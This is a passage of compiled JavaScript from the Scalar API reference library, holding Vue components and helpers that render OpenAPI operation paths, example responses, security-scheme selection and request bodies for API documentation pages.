//#region node_modules/@scalar/api-reference/dist/features/Operation/helpers/filter-selected-security.js
/** Builds a quick cache key from the sorted object keys */
var getKey = (requirement) => Object.keys(requirement).sort().join(",");
/**
* Find the intersection between which security is selected on the document and what this operation requires
*
* If there is no overlap, we return the first requirement
*/
var filterSelectedSecurity = (document, operation, selectedSecurityDocument, selectedSecurityOperation, securitySchemes = {}) => {
	const securityRequirements = operation?.security ?? document.security ?? [];
	/** The selected security keys for the document */
	const selectedSecurity = getSelectedSecurity(selectedSecurityDocument, selectedSecurityOperation, securityRequirements);
	/** Build a set for O(1) lookup */
	const requirementSet = new Set(securityRequirements.map((r) => getKey(r)));
	const selectedRequirement = selectedSecurity.selectedSchemes[selectedSecurity.selectedIndex];
	if (selectedRequirement && requirementSet.has(getKey(selectedRequirement))) return getSecuritySchemes(securitySchemes, selectedRequirement);
	for (const selected of selectedSecurity.selectedSchemes) if (requirementSet.has(getKey(selected))) return getSecuritySchemes(securitySchemes, selected);
	/**
	* If we are selected security on the document,
	* we should show the first requirement of the operation to show auth is required
	*/
	if (operation?.security?.length) return getSecuritySchemes(securitySchemes, securityRequirements[0] ?? {});
	return [];
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/OperationPath.vue.script.js
var _hoisted_1$36 = { key: 0 };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/OperationPath.vue.js
var OperationPath_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "OperationPath",
	props: {
		path: {},
		deprecated: { type: Boolean }
	},
	setup(__props) {
		const props = __props;
		const isVariable = (part) => part.startsWith("{") && part.endsWith("}");
		const pathParts = computed(() => props.path.split(/({[^}]+})/));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("span", { class: normalizeClass(["operation-path", { deprecated: __props.deprecated }]) }, [(openBlock(true), createElementBlock(Fragment, null, renderList(pathParts.value, (part, i) => {
				return openBlock(), createElementBlock(Fragment, { key: i }, [isVariable(part) ? (openBlock(), createElementBlock("em", _hoisted_1$36, toDisplayString(part), 1)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(toDisplayString(part), 1)], 64))], 64);
			}), 128))], 2);
		};
	}
}), [["__scopeId", "data-v-ec6c8861"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleSchema.vue.script.js
var VIRTUALIZATION_THRESHOLD$1 = 2e4;
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleSchema.vue.js
var ExampleSchema_default = /* @__PURE__ */ defineComponent({
	__name: "ExampleSchema",
	props: {
		id: {},
		schema: {}
	},
	setup(__props) {
		const schemaContent = computed(() => {
			if (!__props.schema) return;
			return prettyPrintJson(getResolvedRefDeep(__props.schema));
		});
		const shouldVirtualizeSchema = computed(() => {
			return (schemaContent.value?.length ?? 0) > VIRTUALIZATION_THRESHOLD$1;
		});
		return (_ctx, _cache) => {
			return !shouldVirtualizeSchema.value ? (openBlock(), createBlock(unref(ScalarCodeBlock_default), {
				key: 0,
				id: __props.id,
				class: "bg-b-2",
				lang: "json",
				prettyPrintedContent: schemaContent.value ?? ""
			}, null, 8, ["id", "prettyPrintedContent"])) : (openBlock(), createBlock(unref(ScalarVirtualCodeBlock_default), {
				key: 1,
				id: __props.id,
				class: "bg-b-2",
				content: schemaContent.value ?? "",
				lang: "json"
			}, null, 8, ["id", "content"]));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/helpers/get-example-content.js
/** Keep the displayed response and its clipboard action on the same resolved, formatted value. */
var getExampleContent = (response, example, { contentType = "application/json", compositionSelection, openapiVersion, onDiagnostic } = {}) => {
	if (isXmlMediaType(contentType)) return getXmlBodyExample(response?.schema, example, {
		mode: "read",
		compositionSelection,
		emptyString: "string",
		openapiVersion,
		onDiagnostic
	}).xml;
	if (example !== void 0) {
		const selected = getExampleValue(getResolvedRefDeep(example));
		if (isStreamingContentType(contentType) && selected?.source !== "serialized") {
			const value = selected?.value;
			return value === void 0 ? "" : typeof value === "string" ? value : serializeStreamExample(value, contentType, false) ?? JSON.stringify(value, null, 2);
		}
		const explicitText = getExplicitExampleText(selected, contentType, 2);
		if (explicitText !== void 0) return explicitText;
		const value = selected?.value;
		if (selected?.source === "value") return prettyPrintJson(value === void 0 ? "" : value);
		return typeof value === "string" ? prettyPrintJson(value) : JSON.stringify(value, null, 2) ?? "";
	}
	const contentSchema = response?.schema ?? response?.itemSchema;
	if (contentSchema) {
		const schema = getResolvedRefDeep(contentSchema);
		if (!schema) return;
		const content = getExampleFromSchema(schema, {
			emptyString: "string",
			mode: "read",
			compositionSelection
		});
		if (content === void 0) return;
		return serializeStreamExample(content, contentType, response?.schema === void 0) ?? prettyPrintJson(content);
	}
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponse.vue.script.js
var _hoisted_1$35 = { class: "bg-b-2" };
var _hoisted_2$21 = {
	key: 0,
	class: "flex flex-col gap-2 px-3 py-3"
};
var _hoisted_3$15 = {
	key: 0,
	class: "text-c-1 font-medium"
};
var _hoisted_4$9 = {
	key: 3,
	class: "empty-state"
};
var VIRTUALIZATION_THRESHOLD = 2e4;
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponse.vue.js
var ExampleResponse_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ExampleResponse",
	props: {
		response: {},
		example: {},
		content: {},
		openapiVersion: {},
		generationError: {},
		pending: {
			type: Boolean,
			default: false
		},
		contentType: { default: "application/json" }
	},
	setup(__props) {
		const { translate } = useLocalization();
		const resolvedExample = computed(() => getResolvedRef(__props.example));
		/** Preformatted content is shared with the response card clipboard action. */
		const generatedExample = computed(() => {
			let error = __props.generationError;
			return {
				value: __props.pending || error ? void 0 : __props.content ?? getExampleContent(__props.response, __props.example, {
					contentType: __props.contentType,
					openapiVersion: __props.openapiVersion,
					onDiagnostic: (diagnostic) => {
						if (diagnostic.severity === "error" && error === void 0) error = diagnostic;
					}
				}),
				error
			};
		});
		const prettyPrintedContent = computed(() => generatedExample.value.value);
		const errorMessage = computed(() => {
			const error = generatedExample.value.error;
			if (!error) return void 0;
			return error.code === "limit-exceeded" ? translate("response.xmlGenerationLimit") : translate("response.xmlGenerationFailed", { message: error.message });
		});
		const shouldVirtualize = computed(() => {
			if (prettyPrintedContent.value === void 0) return false;
			return prettyPrintedContent.value.length > VIRTUALIZATION_THRESHOLD;
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$35, [resolvedExample.value?.summary || resolvedExample.value?.description ? (openBlock(), createElementBlock("div", _hoisted_2$21, [resolvedExample.value.summary ? (openBlock(), createElementBlock("div", _hoisted_3$15, toDisplayString(resolvedExample.value.summary), 1)) : createCommentVNode("", true), resolvedExample.value.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
				key: 1,
				value: resolvedExample.value.description
			}, null, 8, ["value"])) : createCommentVNode("", true)])) : createCommentVNode("", true), prettyPrintedContent.value !== void 0 && !shouldVirtualize.value ? (openBlock(), createBlock(unref(ScalarCodeBlock_default), {
				key: 1,
				class: "bg-b-2",
				lang: unref(isXmlMediaType)(__props.contentType) ? "xml" : "json",
				prettyPrintedContent: prettyPrintedContent.value
			}, null, 8, ["lang", "prettyPrintedContent"])) : prettyPrintedContent.value !== void 0 && shouldVirtualize.value ? (openBlock(), createBlock(unref(ScalarVirtualCodeBlock_default), {
				key: 2,
				class: "bg-b-2",
				content: prettyPrintedContent.value,
				lang: unref(isXmlMediaType)(__props.contentType) ? "xml" : "json"
			}, null, 8, ["content", "lang"])) : (openBlock(), createElementBlock("div", _hoisted_4$9, toDisplayString(errorMessage.value ?? unref(translate)("response.noBody")), 1))]);
		};
	}
}), [["__scopeId", "data-v-de30bc79"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponseTab.vue.js
var ExampleResponseTab_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ExampleResponseTab",
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(xe), { as: "template" }, {
				default: withCtx(({ selected }) => [createBaseVNode("button", {
					class: normalizeClass(["tab", { "tab-selected": selected }]),
					type: "button"
				}, [createBaseVNode("span", null, [renderSlot(_ctx.$slots, "default", {}, void 0, true)])], 2)]),
				_: 3
			});
		};
	}
}), [["__scopeId", "data-v-804dba49"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponseTabList.vue.js
var ExampleResponseTabList_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ExampleResponseTabList",
	emits: ["change"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const changeTab = (index) => {
			emit("change", index);
		};
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarCardHeader_default), { class: "scalar-card-header scalar-card-header-tabs" }, {
				actions: withCtx(() => [renderSlot(_ctx.$slots, "actions", {}, void 0, true)]),
				default: withCtx(() => [createVNode(unref(me), { onChange: changeTab }, {
					default: withCtx(() => [createVNode(unref(pe), { class: "tab-list custom-scroll" }, {
						default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, void 0, true)]),
						_: 3
					})]),
					_: 3
				})]),
				_: 3
			});
		};
	}
}), [["__scopeId", "data-v-49a8c0af"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/helpers/get-response-variants.js
/** Keep explicit schema samples ahead of generated union variants. */
var getResponseVariants = (response) => {
	const schema = resolve.schema(response?.schema ?? response?.itemSchema);
	if (!schema || schema.examples?.[0] !== void 0 || schema.example !== void 0 || schema.default !== void 0 || schema.const !== void 0 || schema.enum !== void 0) return;
	const composition = schema.oneOf ? "oneOf" : "anyOf";
	const variants = schema[composition];
	if (!variants || variants.length < 2) return;
	const options = variants.flatMap((variant, index) => {
		if (getResolvedRef(variant) === void 0) return [];
		const resolved = resolve.schema(variant);
		if (!resolved) return [];
		const name = getModelNameWithArray(resolved)?.label;
		return [{
			key: String(index),
			summary: name || `${getSchemaType(resolved)} ${index + 1}`,
			schema: resolved
		}];
	});
	if (options.length < 2) return;
	return {
		composition,
		examples: Object.fromEntries(options.map(({ key, summary }) => [key, { summary }])),
		defaultKey: (options.find(({ schema }) => !("type" in schema) || schema.type !== "null") ?? options[0]).key
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/helpers/normalize-mime-type.js
function normalizeMimeType(contentType) {
	if (typeof contentType !== "string") return;
	return contentType.replace(/;.*$/, "").replace(/\/(?!.*vnd\.|fhir\+).*\+/, "/").trim();
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/helpers/normalize-mime-type-object.js
/**
* Remove charset from content types
*
* Example: `application/json; charset=utf-8` -> `application/json`
*/
function normalizeMimeTypeObject(content) {
	if (!content) return content;
	const newContent = { ...content };
	Object.entries(newContent).forEach(([key, value]) => {
		const normalizedKey = normalizeMimeType(key);
		if (normalizedKey) newContent[normalizedKey] = value;
	});
	return newContent;
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/helpers/has-response-content.js
/**
* Checks if a media type object has any displayable content.
* This includes having a schema, a single example, or multiple examples.
*
* Note: We use explicit property checks for `example` because falsy values
* like `0`, `false`, and `""` are valid JSON examples that should be displayed.
* We still treat `null` as "no content" since it explicitly indicates absence.
*/
function hasMediaTypeContent(mediaType) {
	if (!mediaType) return false;
	const hasSchema = Boolean(mediaType.schema || mediaType.itemSchema);
	const hasExample = "example" in mediaType && mediaType.example !== null;
	const hasExamples = Boolean(mediaType.examples);
	return hasSchema || hasExample || hasExamples;
}
function isResponseKey(responseKey) {
	return responseKey === "default" || /^[1-5][0-9]{2}$/.test(responseKey) || /^[1-5]XX$/.test(responseKey);
}
/**
* Checks if a response object has body content (schema, example, or examples).
* Looks through common media types in priority order.
*/
function hasResponseContent(response, responseKey) {
	if (responseKey !== void 0) {
		if (!isResponseKey(responseKey)) return false;
		return Boolean(response);
	}
	const normalizedContent = normalizeMimeTypeObject(response?.content);
	const keys = objectKeys(normalizedContent ?? {});
	return hasMediaTypeContent(normalizedContent?.["application/json"] ?? normalizedContent?.["application/xml"] ?? normalizedContent?.["text/plain"] ?? normalizedContent?.["text/html"] ?? normalizedContent?.["*/*"] ?? normalizedContent?.[keys[0] ?? ""]);
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponses.vue.script.js
var _hoisted_1$34 = ["aria-label"];
var _hoisted_2$20 = {
	key: 1,
	class: "scalar-card-checkbox"
};
var _hoisted_3$14 = ["aria-controls"];
var _hoisted_4$8 = { class: "text-c-2 px-3 pt-2 text-sm" };
var _hoisted_5$7 = {
	key: 1,
	class: "text-c-2 p-4",
	role: "status"
};
var _hoisted_6$6 = { class: "response-description" };
var _hoisted_7$5 = {
	key: 0,
	class: "response-description-summary text-c-1"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/example-responses/ExampleResponses.vue.js
var ExampleResponses_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ExampleResponses",
	props: {
		openapiVersion: {},
		responses: {},
		selectedExample: {},
		eventBus: {},
		selectedContentTypes: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const id = useId();
		const { copyToClipboard } = useClipboard();
		const orderedStatusCodes = computed(() => Object.keys(__props.responses ?? {}).sort());
		const statusCodesWithContent = computed(() => orderedStatusCodes.value.filter((statusCode) => hasResponseContent(getResolvedRef(__props.responses?.[statusCode]), statusCode)));
		const selectedResponseIndex = ref(0);
		/**
		* Clamp the selected index when the filtered list shrinks.
		* Without this, the index can become out of bounds and cause a mismatch
		* between the visible tabs and the displayed content.
		*
		* We re-resolve `selectedExampleKey` the same way `changeTab` does, so the picker keeps the
		* document-wide selection when the newly active response defines it instead of being blanked out.
		*/
		watch(statusCodesWithContent, (codes) => {
			if (codes.length === 0) selectedResponseIndex.value = 0;
			else if (selectedResponseIndex.value >= codes.length) selectedResponseIndex.value = codes.length - 1;
			else return;
			selectedExampleKey.value = resolveExampleKey(__props.selectedExample);
		});
		const currentResponse = computed(() => {
			const currentStatusCode = toValue(statusCodesWithContent)[toValue(selectedResponseIndex)] ?? "";
			return getResolvedRef(__props.responses?.[currentStatusCode]);
		});
		const normalizedResponseContent = computed(() => normalizeMimeTypeObject(currentResponse.value?.content));
		const currentContentType = computed(() => {
			const content = normalizedResponseContent.value;
			const statusCode = toValue(statusCodesWithContent)[toValue(selectedResponseIndex)] ?? "";
			const selected = __props.selectedContentTypes?.[statusCode];
			const keys = objectKeys(content ?? {});
			return selected && keys.includes(selected) ? selected : keys[0] ?? "";
		});
		const currentResponseContent = computed(() => normalizedResponseContent.value?.[currentContentType.value]);
		const hasMultipleExamples = computed(() => !!currentResponseContent.value?.examples && Object.keys(currentResponseContent.value?.examples ?? {}).length > 1);
		const selectedExampleKey = ref("");
		/** Resolve the example key to show, preferring the document-wide selection when this response has it */
		const resolveExampleKey = (preferred) => {
			const keys = Object.keys(currentResponseContent.value?.examples ?? {});
			if (preferred && keys.includes(preferred)) return preferred;
			if (selectedExampleKey.value && keys.includes(selectedExampleKey.value)) return selectedExampleKey.value;
			return keys[0] ?? "";
		};
		selectedExampleKey.value = resolveExampleKey(__props.selectedExample);
		watch(currentResponseContent, () => {
			selectedExampleKey.value = resolveExampleKey(__props.selectedExample);
		});
		watch(() => __props.selectedExample, (preferred) => {
			selectedExampleKey.value = resolveExampleKey(preferred);
		});
		/** Select an example and sync the choice across the document so other operations follow */
		const selectExample = (key) => {
			selectedExampleKey.value = key;
			__props.eventBus?.emit("workspace:update:selected-example", key);
		};
		/** Get the current example to display */
		const selectedExampleObject = computed(() => {
			if (!currentResponseContent.value) return;
			if (hasMultipleExamples.value && selectedExampleKey.value) return getResolvedRef(currentResponseContent.value.examples?.[selectedExampleKey.value]);
			return getExample({ content: { response: currentResponseContent.value } }, void 0, "response");
		});
		const changeTab = (index) => {
			selectedResponseIndex.value = index;
			selectedExampleKey.value = resolveExampleKey(__props.selectedExample);
		};
		const card = ref(null);
		const visible = useExampleVisibility(card);
		const showSchema = ref(false);
		const externalExamples = useExternalExamples(() => [selectedExampleObject.value], () => visible.value && !showSchema.value);
		const currentExample = computed(() => externalExamples.resolve(selectedExampleObject.value));
		/** Explicit examples take precedence over generated schema variants. */
		const responseVariants = computed(() => currentExample.value === void 0 ? getResponseVariants(currentResponseContent.value) : void 0);
		const selectedVariantKey = ref("");
		const currentVariantKey = computed(() => {
			const variants = responseVariants.value;
			return variants && Object.hasOwn(variants.examples, selectedVariantKey.value) ? selectedVariantKey.value : variants?.defaultKey ?? "";
		});
		watch([
			selectedResponseIndex,
			currentResponse,
			currentContentType,
			currentResponseContent
		], () => {
			selectedVariantKey.value = "";
		}, { flush: "sync" });
		const exampleResult = computed(() => {
			let error;
			return {
				content: externalExamples.pending.value ? void 0 : getExampleContent(currentResponseContent.value, currentExample.value, {
					contentType: currentContentType.value,
					compositionSelection: responseVariants.value ? { [responseVariants.value.composition]: Number(currentVariantKey.value) } : void 0,
					openapiVersion: __props.openapiVersion,
					onDiagnostic: (diagnostic) => {
						if (diagnostic.severity === "error" && !error) error = diagnostic;
					}
				}),
				error
			};
		});
		const exampleContent = computed(() => exampleResult.value.content);
		const copyExample = () => {
			if (exampleContent.value !== void 0) copyToClipboard(exampleContent.value);
		};
		return (_ctx, _cache) => {
			return statusCodesWithContent.value.length ? (openBlock(), createBlock(unref(ScalarCard_default), {
				key: 0,
				ref_key: "card",
				ref: card,
				"aria-label": unref(translate)("response.exampleResponses"),
				class: "response-card",
				role: "region"
			}, {
				default: withCtx(() => [
					createVNode(ExampleResponseTabList_default, { onChange: changeTab }, {
						actions: withCtx(() => [exampleContent.value !== void 0 ? (openBlock(), createElementBlock("button", {
							key: 0,
							"aria-label": unref(translate)("common.copyExample"),
							class: "code-copy",
							type: "button",
							onClick: copyExample
						}, [createVNode(unref(ScalarIcon_default), {
							icon: "Clipboard",
							width: "12px"
						})], 8, _hoisted_1$34)) : createCommentVNode("", true), currentResponseContent.value?.schema ?? currentResponseContent.value?.itemSchema ? (openBlock(), createElementBlock("label", _hoisted_2$20, [
							createTextVNode(toDisplayString(unref(translate)("response.showSchema")) + " ", 1),
							withDirectives(createBaseVNode("input", {
								"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => showSchema.value = $event),
								"aria-controls": unref(id),
								class: "scalar-card-checkbox-input",
								type: "checkbox"
							}, null, 8, _hoisted_3$14), [[vModelCheckbox, showSchema.value]]),
							_cache[2] || (_cache[2] = createBaseVNode("span", { class: "scalar-card-checkbox-checkmark" }, null, -1))
						])) : createCommentVNode("", true)]),
						default: withCtx(() => [(openBlock(true), createElementBlock(Fragment, null, renderList(statusCodesWithContent.value, (statusCode) => {
							return openBlock(), createBlock(ExampleResponseTab_default, {
								key: statusCode,
								"aria-controls": unref(id)
							}, {
								default: withCtx(() => [createVNode(ScreenReader_default, null, {
									default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("response.status")) + ":", 1)]),
									_: 1
								}), createTextVNode(" " + toDisplayString(statusCode), 1)]),
								_: 2
							}, 1032, ["aria-controls"]);
						}), 128))]),
						_: 1
					}),
					createVNode(unref(ScalarCardSection_default), { class: "grid flex-1" }, {
						default: withCtx(() => [showSchema.value && (currentResponseContent.value?.schema ?? currentResponseContent.value?.itemSchema) ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [currentResponseContent.value?.schema ? (openBlock(), createBlock(ExampleSchema_default, {
							key: 0,
							id: unref(id),
							schema: currentResponseContent.value.schema
						}, null, 8, ["id", "schema"])) : createCommentVNode("", true), currentResponseContent.value?.itemSchema ? (openBlock(), createElementBlock(Fragment, { key: 1 }, [createBaseVNode("p", _hoisted_4$8, toDisplayString(unref(translate)("common.streamItem")), 1), createVNode(ExampleSchema_default, {
							id: `${unref(id)}-item`,
							schema: currentResponseContent.value.itemSchema
						}, null, 8, ["id", "schema"])], 64)) : createCommentVNode("", true)], 64)) : unref(externalExamples).pending.value ? (openBlock(), createElementBlock("div", _hoisted_5$7, [unref(externalExamples).failed.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [_cache[4] || (_cache[4] = createTextVNode(" Could not load this example. ", -1)), createVNode(unref(ScalarButton_default), {
							size: "sm",
							variant: "ghost",
							onClick: unref(externalExamples).retry
						}, {
							default: withCtx(() => [..._cache[3] || (_cache[3] = [createTextVNode(" Retry ", -1)])]),
							_: 1
						}, 8, ["onClick"])], 64)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode("Loading example…")], 64))])) : (openBlock(), createBlock(ExampleResponse_default, {
							key: 2,
							id: unref(id),
							content: exampleContent.value,
							contentType: currentContentType.value,
							example: currentExample.value,
							generationError: exampleResult.value.error,
							openapiVersion: __props.openapiVersion,
							pending: unref(externalExamples).pending.value,
							response: currentResponseContent.value
						}, null, 8, [
							"id",
							"content",
							"contentType",
							"example",
							"generationError",
							"openapiVersion",
							"pending",
							"response"
						]))]),
						_: 1
					}),
					currentResponse.value?.summary || currentResponse.value?.description || hasMultipleExamples.value || responseVariants.value ? (openBlock(), createBlock(unref(ScalarCardFooter_default), {
						key: 0,
						class: "response-card-footer"
					}, {
						default: withCtx(() => [
							hasMultipleExamples.value ? (openBlock(), createBlock(unref(t$2), {
								key: 0,
								class: "response-example-selector px-0",
								examples: currentResponseContent.value?.examples,
								modelValue: selectedExampleKey.value,
								"onUpdate:modelValue": selectExample
							}, null, 8, ["examples", "modelValue"])) : createCommentVNode("", true),
							responseVariants.value && !showSchema.value ? (openBlock(), createBlock(unref(t$2), {
								key: 1,
								"aria-label": unref(translate)("schema.schema"),
								class: "response-example-selector px-0",
								"data-testid": "response-variant-picker",
								examples: responseVariants.value.examples,
								modelValue: currentVariantKey.value,
								"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => selectedVariantKey.value = $event)
							}, null, 8, [
								"aria-label",
								"examples",
								"modelValue"
							])) : createCommentVNode("", true),
							createBaseVNode("div", _hoisted_6$6, [currentResponse.value?.summary ? (openBlock(), createElementBlock("div", _hoisted_7$5, toDisplayString(currentResponse.value.summary), 1)) : createCommentVNode("", true), currentResponse.value?.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
								key: 1,
								class: "response-description-markdown",
								value: currentResponse.value.description
							}, null, 8, ["value"])) : createCommentVNode("", true)])
						]),
						_: 1
					})) : createCommentVNode("", true)
				]),
				_: 1
			}, 8, ["aria-label"])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-a645be42"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/helpers/flatten-deep-object-query-parameter.js
var isParameterWithSchema = (parameter) => "schema" in parameter && parameter.schema !== void 0;
var resolveSchema = (schema) => {
	return getResolvedRef(schema);
};
var toFlattenedDeepObjectParameter = (parameter, name, description, required, schema) => {
	const { example: _example, examples: _examples, ...parameterWithoutExamples } = parameter;
	return {
		...parameterWithoutExamples,
		name,
		description,
		required,
		schema
	};
};
var flattenDeepObjectProperties = (parameter, schema, namePrefix) => {
	if (!schema.properties) return [parameter];
	const requiredProperties = new Set(schema.required ?? []);
	const flattenedParameters = Object.entries(schema.properties).flatMap(([propertyName, propertySchema]) => {
		const resolvedPropertySchema = resolveSchema(propertySchema);
		if (!resolvedPropertySchema) return [];
		const nestedName = `${namePrefix}[${propertyName}]`;
		const nestedParameter = toFlattenedDeepObjectParameter(parameter, nestedName, resolvedPropertySchema.description ?? parameter.description, requiredProperties.has(propertyName), resolvedPropertySchema);
		if (isObjectSchema(resolvedPropertySchema) && resolvedPropertySchema.properties) return flattenDeepObjectProperties(nestedParameter, resolvedPropertySchema, nestedName);
		return [nestedParameter];
	});
	return flattenedParameters.length > 0 ? flattenedParameters : [parameter];
};
/**
* Deep object query parameters serialize as name[prop] pairs in URLs.
* Rendering the same shape keeps docs aligned with the request UI.
*/
var flattenDeepObjectQueryParameter = (parameter) => {
	if (parameter.in !== "query" || !isParameterWithSchema(parameter) || parameter.style !== "deepObject") return [parameter];
	const resolvedSchema = resolveSchema(parameter.schema);
	if (!resolvedSchema || !isObjectSchema(resolvedSchema)) return [parameter];
	return flattenDeepObjectProperties(parameter, resolvedSchema, parameter.name);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/RequestBody.vue.script.js
var _hoisted_1$33 = ["aria-label"];
var _hoisted_2$19 = { class: "request-body-header" };
var _hoisted_3$13 = {
	key: 0,
	class: "text-c-2 text-xs leading-none font-normal",
	"data-testid": "request-body-schema-name"
};
var _hoisted_4$7 = { class: "flex items-center gap-2" };
var _hoisted_5$6 = {
	key: 0,
	class: "request-body-required"
};
var _hoisted_6$5 = {
	key: 0,
	class: "request-body-description"
};
var _hoisted_7$4 = {
	key: 0,
	class: "text-c-2 pt-2 text-sm"
};
var _hoisted_8$4 = {
	key: 2,
	class: "request-body-schema"
};
var _hoisted_9$3 = {
	key: 3,
	class: "request-body-schema"
};
var MAX_VISIBLE_PROPERTIES = 12;
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/RequestBody.vue.js
var RequestBody_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "RequestBody",
	props: /*@__PURE__*/ mergeModels({
		breadcrumb: {},
		requestBody: {},
		eventBus: {},
		document: {},
		options: {}
	}, {
		"selectedContentType": { default: "application/json" },
		"selectedContentTypeModifiers": {}
	}),
	emits: ["update:selectedContentType"],
	setup(__props) {
		const { translate } = useLocalization();
		const { level: headingLevel } = useDocumentOutline("operationSection");
		/**
		* The maximum number of properties to show in the request body schema.
		*/
		const availableContentTypes = computed(() => Object.keys(__props.requestBody?.content ?? {}));
		const selectedContentType = useModel(__props, "selectedContentType");
		if (__props.requestBody?.content) {
			if (availableContentTypes.value[0]) selectedContentType.value = availableContentTypes.value[0];
		}
		/** Raw schema (possibly with $ref) for the selected content type */
		const rawSchema = computed(() => __props.requestBody?.content?.[selectedContentType.value]?.schema ?? __props.requestBody?.content?.[selectedContentType.value]?.itemSchema);
		const schema = computed(() => getResolvedRef(rawSchema.value));
		/** When the schema is a $ref, preserve its name so the UI can show the ref name instead of just the type. */
		const modelLink = computed(() => (rawSchema.value && getModelNameFromSchema(rawSchema.value)) ?? null);
		/** Whether the model name links to the models section, or renders as plain text. */
		const modelLinkable = computed(() => isModelLinkable(modelLink.value?.schemaKey, {
			hideModels: __props.options.hideModels,
			document: __props.document
		}));
		/**
		* Splits schema properties into visible and collapsed sections when there are more than 12 properties.
		* Returns null for schemas with fewer properties or non-object schemas.
		*/
		const partitionedSchema = computed(() => {
			if (!schema.value || !isTypeObject(schema.value)) return null;
			if (inferDiscriminatorMappingComposition(schema.value, __props.document)) return null;
			const sortedNames = sortPropertyNames(schema.value, schema.value.discriminator, {
				hideReadOnly: true,
				orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
				orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst
			});
			if (sortedNames.length <= MAX_VISIBLE_PROPERTIES) return null;
			const { properties, ...schemaMetadata } = schema.value;
			if (!properties) return null;
			return {
				visibleProperties: {
					...schemaMetadata,
					properties: reduceNamesToObject(sortedNames.slice(0, MAX_VISIBLE_PROPERTIES), properties)
				},
				collapsedProperties: {
					...schemaMetadata,
					properties: reduceNamesToObject(sortedNames.slice(MAX_VISIBLE_PROPERTIES), properties)
				}
			};
		});
		/**
		* We don't want to render the request body if its completely empty
		* @example
		* {
		*   "content": {},
		* }
		*/
		const shouldRenderRequestBody = computed(() => Object.keys(__props.requestBody?.content ?? {}).length > 0 || __props.requestBody?.description || __props.requestBody?.required);
		return (_ctx, _cache) => {
			return __props.requestBody && shouldRenderRequestBody.value ? (openBlock(), createElementBlock("div", {
				key: 0,
				"aria-label": unref(translate)("operation.requestBody"),
				class: "request-body",
				role: "group"
			}, [
				createBaseVNode("div", _hoisted_2$19, [
					createVNode(unref(SectionHeaderTag_default), {
						class: "request-body-title flex!",
						level: unref(headingLevel)
					}, {
						default: withCtx(() => [renderSlot(_ctx.$slots, "title", {}, void 0, true), modelLink.value ? (openBlock(), createElementBlock("span", _hoisted_3$13, [_cache[2] || (_cache[2] = createBaseVNode("span", { class: "text-c-3 mx-1.5" }, "·", -1)), __props.eventBus && modelLink.value.schemaKey && modelLinkable.value ? (openBlock(), createBlock(LinkButton_default, {
							key: 0,
							onClick: _cache[0] || (_cache[0] = ($event) => __props.eventBus.emit("scroll-to:model-by-name", { name: modelLink.value.schemaKey }))
						}, {
							default: withCtx(() => [createTextVNode(toDisplayString(modelLink.value.label), 1)]),
							_: 1
						})) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(toDisplayString(modelLink.value.label), 1)], 64))])) : createCommentVNode("", true)]),
						_: 3
					}, 8, ["level"]),
					createBaseVNode("div", _hoisted_4$7, [__props.requestBody.required ? (openBlock(), createElementBlock("div", _hoisted_5$6, toDisplayString(unref(translate)("schema.required")), 1)) : createCommentVNode("", true), createVNode(ContentTypeSelect_default, {
						modelValue: selectedContentType.value,
						"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => selectedContentType.value = $event),
						content: __props.requestBody.content
					}, null, 8, ["modelValue", "content"])]),
					__props.requestBody.description ? (openBlock(), createElementBlock("div", _hoisted_6$5, [createVNode(unref(ScalarMarkdown_default), { value: __props.requestBody.description }, null, 8, ["value"])])) : createCommentVNode("", true)
				]),
